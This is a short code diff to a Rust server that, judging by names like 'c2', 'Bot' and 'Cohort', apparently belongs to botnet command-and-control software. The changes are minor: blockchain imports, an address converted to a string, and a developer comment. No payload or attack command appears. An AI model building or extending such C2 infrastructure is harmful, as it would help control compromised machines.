@@ -28,13 +28,14 @@ use std::{
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
 use base32;
-
 use crate::{
     encoder,
     communication::c2::{Bot, Device_stream},
     communication::lib,
     encryption as enc,
     message as msg,
+    blockchain,
+    blockchain::blockchain::Hashing
 };
 use super::c2;
 
@@ -72,7 +73,7 @@ async fn handle_message_received(DS: &mut c2::Device_stream, socket: &tokio::net
 
 async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr) -> Device_stream {
     let mut DS = Device_stream::new(
-        addr,
+        addr.to_string(),
         false,
         true,
         Vec::new(),
@@ -188,6 +189,7 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
 
     let mut Co: c2::Cohort = c2::Cohort::new();
 
+    // lisandro : make this more generic
     let x = chn_c2_tx.clone();
     thread::spawn(move || {
         client_input(x);
